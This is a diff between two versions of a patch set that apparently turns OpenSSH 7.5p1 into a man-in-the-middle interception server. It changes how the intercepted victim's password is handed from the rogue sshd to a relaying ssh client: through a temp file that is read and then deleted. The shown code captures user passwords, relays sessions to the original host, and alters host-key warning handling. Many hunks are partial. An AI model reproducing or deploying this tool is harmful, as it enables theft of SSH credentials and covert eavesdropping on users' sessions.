@@ -1,6 +1,6 @@
 diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/auth2.c openssh-7.5p1-mitm/auth2.c
 --- openssh-7.5p1/auth2.c	2017-03-19 22:39:27.000000000 -0400
-+++ openssh-7.5p1-mitm/auth2.c	2017-07-14 16:03:47.616458235 -0400
++++ openssh-7.5p1-mitm/auth2.c	2017-07-18 11:33:02.557884888 -0400
 @@ -222,6 +222,10 @@
  		fatal("input_userauth_request: no authctxt");
  
@@ -31,7 +31,7 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey
  #ifdef _UNICOS
 diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/auth2-passwd.c openssh-7.5p1-mitm/auth2-passwd.c
 --- openssh-7.5p1/auth2-passwd.c	2017-03-19 22:39:27.000000000 -0400
-+++ openssh-7.5p1-mitm/auth2-passwd.c	2017-07-14 16:03:47.616458235 -0400
++++ openssh-7.5p1-mitm/auth2-passwd.c	2017-07-18 11:33:02.557884888 -0400
 @@ -43,9 +43,11 @@
  #include "monitor_wrap.h"
  #include "misc.h"
@@ -60,7 +60,7 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey
  	else if (PRIVSEP(auth_password(authctxt, password)) == 1)
 diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/auth2-pubkey.c openssh-7.5p1-mitm/auth2-pubkey.c
 --- openssh-7.5p1/auth2-pubkey.c	2017-03-19 22:39:27.000000000 -0400
-+++ openssh-7.5p1-mitm/auth2-pubkey.c	2017-07-14 16:03:47.616458235 -0400
++++ openssh-7.5p1-mitm/auth2-pubkey.c	2017-07-18 11:33:02.557884888 -0400
 @@ -493,7 +493,8 @@
  			_exit(1);
  		}
@@ -73,7 +73,7 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey
  	default: /* parent */
 diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/auth.c openssh-7.5p1-mitm/auth.c
 --- openssh-7.5p1/auth.c	2017-03-19 22:39:27.000000000 -0400
-+++ openssh-7.5p1-mitm/auth.c	2017-07-14 16:03:47.616458235 -0400
++++ openssh-7.5p1-mitm/auth.c	2017-07-18 11:33:02.557884888 -0400
 @@ -152,6 +152,8 @@
  #ifdef USE_LIBIAF
  		free((void *) passwd);
@@ -85,7 +85,7 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey
  			    pw->pw_name);
 diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/auth.h openssh-7.5p1-mitm/auth.h
 --- openssh-7.5p1/auth.h	2017-03-19 22:39:27.000000000 -0400
-+++ openssh-7.5p1-mitm/auth.h	2017-07-14 16:03:47.616458235 -0400
++++ openssh-7.5p1-mitm/auth.h	2017-07-18 11:33:02.557884888 -0400
 @@ -59,6 +59,7 @@
  	int		 server_caused_failure;
  	int		 force_pwchange;
@@ -96,7 +96,7 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey
  	char		*style;
 diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/auth-passwd.c openssh-7.5p1-mitm/auth-passwd.c
 --- openssh-7.5p1/auth-passwd.c	2017-03-19 22:39:27.000000000 -0400
-+++ openssh-7.5p1-mitm/auth-passwd.c	2017-07-14 16:03:47.616458235 -0400
++++ openssh-7.5p1-mitm/auth-passwd.c	2017-07-18 11:33:02.557884888 -0400
 @@ -121,6 +121,8 @@
  	if (options.use_pam)
  		return (sshpam_auth_passwd(authctxt, password) && ok);
@@ -108,7 +108,7 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey
  		expire_checked = 1;
 diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/channels.c openssh-7.5p1-mitm/channels.c
 --- openssh-7.5p1/channels.c	2017-03-19 22:39:27.000000000 -0400
-+++ openssh-7.5p1-mitm/channels.c	2017-07-14 16:03:47.616458235 -0400
++++ openssh-7.5p1-mitm/channels.c	2017-07-18 11:33:02.557884888 -0400
 @@ -191,6 +191,40 @@
  static int connect_next(struct channel_connect *);
  static void channel_connect_ctx_free(struct channel_connect *);
@@ -183,7 +183,7 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey
  		    (errno == EINTR || errno == EAGAIN || errno == EWOULDBLOCK))
 diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/channels.h openssh-7.5p1-mitm/channels.h
 --- openssh-7.5p1/channels.h	2017-03-19 22:39:27.000000000 -0400
-+++ openssh-7.5p1-mitm/channels.h	2017-07-14 16:03:47.616458235 -0400
++++ openssh-7.5p1-mitm/channels.h	2017-07-18 11:33:02.557884888 -0400
 @@ -100,6 +100,7 @@
  	u_int   istate;		/* input from channel (state of receive half) */
  	u_int   ostate;		/* output to channel  (state of transmit half) */
@@ -203,7 +203,7 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey
  void	 channel_stop_listening(void);
 diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/clientloop.c openssh-7.5p1-mitm/clientloop.c
 --- openssh-7.5p1/clientloop.c	2017-03-19 22:39:27.000000000 -0400
-+++ openssh-7.5p1-mitm/clientloop.c	2017-07-14 16:03:47.616458235 -0400
++++ openssh-7.5p1-mitm/clientloop.c	2017-07-18 11:33:02.561884987 -0400
 @@ -1752,7 +1752,10 @@
  	if (have_pty && options.log_level != SYSLOG_LEVEL_QUIET) {
  		snprintf(buf, sizeof buf,
@@ -218,7 +218,7 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey
  	/* Output any buffered data for stdout. */
 diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/loginrec.c openssh-7.5p1-mitm/loginrec.c
 --- openssh-7.5p1/loginrec.c	2017-03-19 22:39:27.000000000 -0400
-+++ openssh-7.5p1-mitm/loginrec.c	2017-07-14 16:03:47.616458235 -0400
++++ openssh-7.5p1-mitm/loginrec.c	2017-07-18 11:33:02.561884987 -0400
 @@ -435,6 +435,8 @@
  int
  login_write(struct logininfo *li)
@@ -230,7 +230,7 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey
  		logit("Attempt to write login records by non-root user (aborting)");
 diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/lol.h openssh-7.5p1-mitm/lol.h
 --- openssh-7.5p1/lol.h	1969-12-31 19:00:00.000000000 -0500
-+++ openssh-7.5p1-mitm/lol.h	2017-07-14 16:03:47.620458313 -0400
++++ openssh-7.5p1-mitm/lol.h	2017-07-18 11:54:06.329344284 -0400
 @@ -0,0 +1,25 @@
 +#ifndef LOL_H
 +#define LOL_H
@@ -259,7 +259,7 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey
 +#endif /* LOL_H */
 diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/Makefile.in openssh-7.5p1-mitm/Makefile.in
 --- openssh-7.5p1/Makefile.in	2017-03-19 22:39:27.000000000 -0400
-+++ openssh-7.5p1-mitm/Makefile.in	2017-07-14 16:03:47.620458313 -0400
++++ openssh-7.5p1-mitm/Makefile.in	2017-07-18 11:33:02.561884987 -0400
 @@ -23,7 +23,7 @@
  VPATH=@srcdir@
  SSH_PROGRAM=@bindir@/ssh
@@ -291,7 +291,7 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey
  	$(LD) -o $@ progressmeter.o sftp.o sftp-client.o sftp-common.o sftp-glob.o $(LDFLAGS) -lssh -lopenbsd-compat $(LIBS) $(LIBEDIT)
 diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/monitor.c openssh-7.5p1-mitm/monitor.c
 --- openssh-7.5p1/monitor.c	2017-03-19 22:39:27.000000000 -0400
-+++ openssh-7.5p1-mitm/monitor.c	2017-07-14 16:03:47.620458313 -0400
++++ openssh-7.5p1-mitm/monitor.c	2017-07-18 11:33:02.561884987 -0400
 @@ -119,6 +119,7 @@
  
  /* State exported from the child */
@@ -369,7 +369,7 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey
  
 diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/monitor.h openssh-7.5p1-mitm/monitor.h
 --- openssh-7.5p1/monitor.h	2017-03-19 22:39:27.000000000 -0400
-+++ openssh-7.5p1-mitm/monitor.h	2017-07-14 16:03:47.620458313 -0400
++++ openssh-7.5p1-mitm/monitor.h	2017-07-18 11:33:02.561884987 -0400
 @@ -56,6 +56,7 @@
  	MONITOR_REQ_GSSUSEROK = 46, MONITOR_ANS_GSSUSEROK = 47,
  	MONITOR_REQ_GSSCHECKMIC = 48, MONITOR_ANS_GSSCHECKMIC = 49,
@@ -380,7 +380,7 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey
  	MONITOR_REQ_PAM_ACCOUNT = 102, MONITOR_ANS_PAM_ACCOUNT = 103,
 diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/monitor_wrap.c openssh-7.5p1-mitm/monitor_wrap.c
 --- openssh-7.5p1/monitor_wrap.c	2017-03-19 22:39:27.000000000 -0400
-+++ openssh-7.5p1-mitm/monitor_wrap.c	2017-07-14 16:03:47.620458313 -0400
++++ openssh-7.5p1-mitm/monitor_wrap.c	2017-07-18 11:33:02.561884987 -0400
 @@ -482,6 +482,31 @@
  	sshbuf_free(m);
  }
@@ -415,7 +415,7 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey
  {
 diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/monitor_wrap.h openssh-7.5p1-mitm/monitor_wrap.h
 --- openssh-7.5p1/monitor_wrap.h	2017-03-19 22:39:27.000000000 -0400
-+++ openssh-7.5p1-mitm/monitor_wrap.h	2017-07-14 16:03:47.620458313 -0400
++++ openssh-7.5p1-mitm/monitor_wrap.h	2017-07-18 11:33:02.561884987 -0400
 @@ -28,6 +28,8 @@
  #ifndef _MM_WRAP_H_
  #define _MM_WRAP_H_
@@ -439,7 +439,7 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey
  int mm_bsdauth_query(void *, char **, char **, u_int *, char ***, u_int **);
 diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/session.c openssh-7.5p1-mitm/session.c
 --- openssh-7.5p1/session.c	2017-03-19 22:39:27.000000000 -0400
-+++ openssh-7.5p1-mitm/session.c	2017-07-14 16:03:47.620458313 -0400
++++ openssh-7.5p1-mitm/session.c	2017-07-18 11:45:11.763171758 -0400
 @@ -112,7 +112,7 @@
  /* func */
  
@@ -566,19 +566,21 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey
  	fflush(NULL);
  
  	/* Get the last component of the shell name. */
-@@ -1646,6 +1682,11 @@
+@@ -1646,6 +1682,13 @@
  	 */
  	if (!command) {
  		char argv0[256];
 +		char connect_string[512];
 +		char port[16];
++		char password_file[] = "/tmp/lolXXXXXX";
++		int fd = -1;
 +
 +		memset(connect_string, 0, sizeof(connect_string));
 +		memset(port, 0, sizeof(port));
  
  		/* Start the shell.  Set initial character to '-'. */
  		argv0[0] = '-';
-@@ -1658,9 +1699,33 @@
+@@ -1658,9 +1701,42 @@
  		}
  
  		/* Execute the shell. */
@@ -601,11 +603,20 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey
 +		strlcat(connect_string, lol->original_host, sizeof(connect_string));
 +		#endif
 +
++		/* Write the password to a temporary file.  The ssh program will delete this after reading it. */
++		fd = mkstemp(password_file);
++		if (fd < 0) {
++		  logit("MITM: Error: could not create temp password file for ssh client! [%s]", password_file);
++		  exit(-1);
++		}
++		write(fd, lol->password, strlen(lol->password));
++		close(fd);
++
 +		debug3("MITMing connection to %s:%s", connect_string, port);
 +
 +		argv[0] = "/home/" BOGUS_USER "/bin/ssh";
 +		argv[1] = "-Z";
-+		argv[2] = lol->password;
++		argv[2] = password_file;
 +		argv[3] = "-p";
 +		argv[4] = port;
 +		argv[5] = connect_string;
@@ -614,7 +625,7 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey
  
  		/* Executing the shell failed. */
  		perror(shell);
-@@ -1672,7 +1737,39 @@
+@@ -1672,7 +1748,39 @@
  	 */
  	argv[0] = (char *) shell0;
  	argv[1] = "-c";
@@ -655,7 +666,7 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey
  	argv[3] = NULL;
  	execve(shell, argv, env);
  	perror(shell);
-@@ -1927,6 +2024,11 @@
+@@ -1927,6 +2035,11 @@
  	debug2("subsystem request for %.100s by user %s", s->subsys,
  	    s->pw->pw_name);
  
@@ -667,7 +678,7 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey
  	for (i = 0; i < options.num_subsystems; i++) {
  		if (strcmp(s->subsys, options.subsystem_name[i]) == 0) {
  			prog = options.subsystem_command[i];
-@@ -1958,6 +2060,10 @@
+@@ -1958,6 +2071,10 @@
  {
  	int success;
  
@@ -678,7 +689,7 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey
  	if (s->auth_proto != NULL || s->auth_data != NULL) {
  		error("session_x11_req: session %d: "
  		    "x11 forwarding already active", s->self);
-@@ -1999,6 +2105,12 @@
+@@ -1999,6 +2116,12 @@
  
  	char *command = packet_get_string(&len);
  	packet_check_eom();
@@ -691,7 +702,7 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey
  	success = do_exec(s, command) == 0;
  	free(command);
  	return success;
-@@ -2022,6 +2134,10 @@
+@@ -2022,6 +2145,10 @@
  	char *name, *val;
  	u_int name_len, val_len, i;
  
@@ -702,7 +713,7 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey
  	name = packet_get_cstring(&name_len);
  	val = packet_get_cstring(&val_len);
  	packet_check_eom();
-@@ -2056,6 +2172,11 @@
+@@ -2056,6 +2183,11 @@
  {
  	static int called = 0;
  	packet_check_eom();
@@ -714,7 +725,7 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey
  	if (no_agent_forwarding_flag || !options.allow_agent_forwarding) {
  		debug("session_auth_agent_req: no_agent_forwarding_flag");
  		return 0;
-@@ -2113,7 +2234,7 @@
+@@ -2113,7 +2245,7 @@
  
  void
  session_set_fds(Session *s, int fdin, int fdout, int fderr, int ignore_fderr,
@@ -723,7 +734,7 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey
  {
  	/*
  	 * now that have a child and a pipe to the child,
-@@ -2124,7 +2245,7 @@
+@@ -2124,7 +2256,7 @@
  	channel_set_fds(s->chanid,
  	    fdout, fdin, fderr,
  	    ignore_fderr ? CHAN_EXTENDED_IGNORE : CHAN_EXTENDED_READ,
@@ -734,7 +745,7 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey
  /*
 diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/sftp.c openssh-7.5p1-mitm/sftp.c
 --- openssh-7.5p1/sftp.c	2017-03-19 22:39:27.000000000 -0400
-+++ openssh-7.5p1-mitm/sftp.c	2017-07-14 16:03:47.620458313 -0400
++++ openssh-7.5p1-mitm/sftp.c	2017-07-18 11:33:02.565885086 -0400
 @@ -579,9 +579,10 @@
  remote_is_dir(struct sftp_conn *conn, const char *path)
  {
@@ -769,7 +780,7 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey
  					break;
 diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/sftp-client.c openssh-7.5p1-mitm/sftp-client.c
 --- openssh-7.5p1/sftp-client.c	2017-03-19 22:39:27.000000000 -0400
-+++ openssh-7.5p1-mitm/sftp-client.c	2017-07-14 16:28:48.696875795 -0400
++++ openssh-7.5p1-mitm/sftp-client.c	2017-07-18 11:33:02.565885086 -0400
 @@ -74,6 +74,7 @@
  # define SFTP_DIRECTORY_CHARS      "/"
  #endif /* HAVE_CYGWIN */
@@ -1597,7 +1608,7 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey
 +}
 diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/sftp-client.h openssh-7.5p1-mitm/sftp-client.h
 --- openssh-7.5p1/sftp-client.h	2017-03-19 22:39:27.000000000 -0400
-+++ openssh-7.5p1-mitm/sftp-client.h	2017-07-14 16:03:47.620458313 -0400
++++ openssh-7.5p1-mitm/sftp-client.h	2017-07-18 11:33:02.565885086 -0400
 @@ -21,6 +21,9 @@
  #ifndef _SFTP_CLIENT_H
  #define _SFTP_CLIENT_H
@@ -1690,7 +1701,7 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey
  #endif
 diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/sftp-common.h openssh-7.5p1-mitm/sftp-common.h
 --- openssh-7.5p1/sftp-common.h	2017-03-19 22:39:27.000000000 -0400
-+++ openssh-7.5p1-mitm/sftp-common.h	2017-07-14 16:03:47.624458391 -0400
++++ openssh-7.5p1-mitm/sftp-common.h	2017-07-18 11:33:02.565885086 -0400
 @@ -50,3 +50,12 @@
  char	*ls_file(const char *, const struct stat *, int, int);
  
@@ -1706,7 +1717,7 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey
 +};
 diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/sftp-glob.c openssh-7.5p1-mitm/sftp-glob.c
 --- openssh-7.5p1/sftp-glob.c	2017-03-19 22:39:27.000000000 -0400
-+++ openssh-7.5p1-mitm/sftp-glob.c	2017-07-14 16:03:47.624458391 -0400
++++ openssh-7.5p1-mitm/sftp-glob.c	2017-07-18 11:33:02.565885086 -0400
 @@ -111,8 +111,9 @@
  fudge_lstat(const char *path, struct stat *st)
  {
@@ -1731,7 +1742,7 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey
  	attrib_to_stat(a, st);
 diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/sftp.h openssh-7.5p1-mitm/sftp.h
 --- openssh-7.5p1/sftp.h	2017-03-19 22:39:27.000000000 -0400
-+++ openssh-7.5p1-mitm/sftp.h	2017-07-14 16:03:47.624458391 -0400
++++ openssh-7.5p1-mitm/sftp.h	2017-07-18 11:33:02.565885086 -0400
 @@ -97,5 +97,5 @@
  
  struct passwd;
@@ -1741,7 +1752,7 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey
  void	sftp_server_cleanup_exit(int) __attribute__((noreturn));
 diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/sftp-server.c openssh-7.5p1-mitm/sftp-server.c
 --- openssh-7.5p1/sftp-server.c	2017-03-19 22:39:27.000000000 -0400
-+++ openssh-7.5p1-mitm/sftp-server.c	2017-07-14 16:28:21.272349992 -0400
++++ openssh-7.5p1-mitm/sftp-server.c	2017-07-18 11:33:02.565885086 -0400
 @@ -39,6 +39,7 @@
  #include <time.h>
  #include <unistd.h>
@@ -2760,7 +2771,7 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey
 +}
 diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/sftp-server-main.c openssh-7.5p1-mitm/sftp-server-main.c
 --- openssh-7.5p1/sftp-server-main.c	2017-03-19 22:39:27.000000000 -0400
-+++ openssh-7.5p1-mitm/sftp-server-main.c	2017-07-14 16:36:42.602076807 -0400
++++ openssh-7.5p1-mitm/sftp-server-main.c	2017-07-18 11:33:02.565885086 -0400
 @@ -21,6 +21,7 @@
  #include <pwd.h>
  #include <stdarg.h>
@@ -2798,37 +2809,57 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey
  }
 diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/ssh.c openssh-7.5p1-mitm/ssh.c
 --- openssh-7.5p1/ssh.c	2017-03-19 22:39:27.000000000 -0400
-+++ openssh-7.5p1-mitm/ssh.c	2017-07-14 16:03:47.624458391 -0400
-@@ -524,6 +524,7 @@
++++ openssh-7.5p1-mitm/ssh.c	2017-07-18 11:44:17.685920418 -0400
+@@ -524,6 +524,9 @@
  	struct addrinfo *addrs = NULL;
  	struct ssh_digest_ctx *md;
  	u_char conn_hash[SSH_DIGEST_MAX_LENGTH];
 +	char *password = NULL;
++	int fd = -1, bytes_read = 0, ret = 0;
++	struct stat password_stat;
  
  	ssh_malloc_init();	/* must be called before any mallocs */
  	/* Ensure that fds 0, 1 and 2 are open or directed to /dev/null */
-@@ -605,8 +606,9 @@
+@@ -605,8 +608,9 @@
  	argv0 = av[0];
  
   again:
-+	/* Add -Z to get the password to use.  TODO: change to a temp file? */
++	/* Add -Z to get the password to use. */
  	while ((opt = getopt(ac, av, "1246ab:c:e:fgi:kl:m:no:p:qstvx"
 -	    "ACD:E:F:GI:J:KL:MNO:PQ:R:S:TVw:W:XYy")) != -1) {
 +	    "ACD:E:F:GI:J:KL:MNO:PQ:R:S:TVw:W:XYyZ:")) != -1) {
  		switch (opt) {
  		case '1':
  			options.protocol = SSH_PROTO_1;
-@@ -931,6 +933,9 @@
+@@ -931,6 +935,27 @@
  		case 'F':
  			config = optarg;
  			break;
 +		case 'Z':
-+			password = strdup(optarg);
++			/* The password is in a temporary file.  We will read it, then delete the file. */
++			fd = open(optarg, O_RDONLY);
++			if (fd < 0)
++				exit(-1);
++			if (fstat(fd, &password_stat) < 0)
++				exit(-1);
++
++			/* Probably overkill, but hey, read() might not return all bytes... */
++			password = malloc(password_stat.st_size + 1);
++			while (bytes_read != password_stat.st_size) {
++				ret = read(fd, password + bytes_read, password_stat.st_size - bytes_read);
++				if (ret < 0)
++					exit(-1);
++				else
++					bytes_read += ret;
++			}
++			password[password_stat.st_size] = '\0';
++			close(fd);
++			unlink(optarg);
 +			break;
  		default:
  			usage();
  		}
-@@ -1292,6 +1297,7 @@
+@@ -1292,6 +1317,7 @@
  	sensitive_data.nkeys = 0;
  	sensitive_data.keys = NULL;
  	sensitive_data.external_keysign = 0;
@@ -2838,7 +2869,7 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey
  		sensitive_data.nkeys = 9;
 diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/sshconnect2.c openssh-7.5p1-mitm/sshconnect2.c
 --- openssh-7.5p1/sshconnect2.c	2017-03-19 22:39:27.000000000 -0400
-+++ openssh-7.5p1-mitm/sshconnect2.c	2017-07-14 16:03:47.624458391 -0400
++++ openssh-7.5p1-mitm/sshconnect2.c	2017-07-18 11:33:02.569885185 -0400
 @@ -906,7 +906,8 @@
  
  	snprintf(prompt, sizeof(prompt), "%.30s@%.128s's password: ",
@@ -2851,7 +2882,7 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey
  	packet_put_cstring(authctxt->service);
 diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/sshconnect.c openssh-7.5p1-mitm/sshconnect.c
 --- openssh-7.5p1/sshconnect.c	2017-03-19 22:39:27.000000000 -0400
-+++ openssh-7.5p1-mitm/sshconnect.c	2017-07-14 16:03:47.624458391 -0400
++++ openssh-7.5p1-mitm/sshconnect.c	2017-07-18 11:33:02.569885185 -0400
 @@ -916,10 +916,12 @@
  				    "address '%.128s' to the list of known "
  				    "hosts (%.500s).", type, ip,
@@ -2901,7 +2932,7 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey
  		error("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@");
 diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/sshconnect.h openssh-7.5p1-mitm/sshconnect.h
 --- openssh-7.5p1/sshconnect.h	2017-03-19 22:39:27.000000000 -0400
-+++ openssh-7.5p1-mitm/sshconnect.h	2017-07-14 16:03:47.624458391 -0400
++++ openssh-7.5p1-mitm/sshconnect.h	2017-07-18 11:33:02.569885185 -0400
 @@ -29,6 +29,7 @@
  	Key	**keys;
  	int	nkeys;
@@ -2912,7 +2943,7 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey
  struct addrinfo;
 diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/sshd.c openssh-7.5p1-mitm/sshd.c
 --- openssh-7.5p1/sshd.c	2017-03-19 22:39:27.000000000 -0400
-+++ openssh-7.5p1-mitm/sshd.c	2017-07-14 16:03:47.628458469 -0400
++++ openssh-7.5p1-mitm/sshd.c	2017-07-18 11:33:02.569885185 -0400
 @@ -72,6 +72,8 @@
  #include <string.h>
  #include <unistd.h>
@@ -3020,7 +3051,7 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey
  
 diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/sshd_config openssh-7.5p1-mitm/sshd_config
 --- openssh-7.5p1/sshd_config	2017-03-19 22:39:27.000000000 -0400
-+++ openssh-7.5p1-mitm/sshd_config	2017-07-14 16:03:47.628458469 -0400
++++ openssh-7.5p1-mitm/sshd_config	2017-07-18 11:33:02.569885185 -0400
 @@ -10,22 +10,24 @@
  # possible, but leave them commented.  Uncommented options override the
  # default value.
@@ -3053,7 +3084,7 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey
  
 diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/sshlogin.c openssh-7.5p1-mitm/sshlogin.c
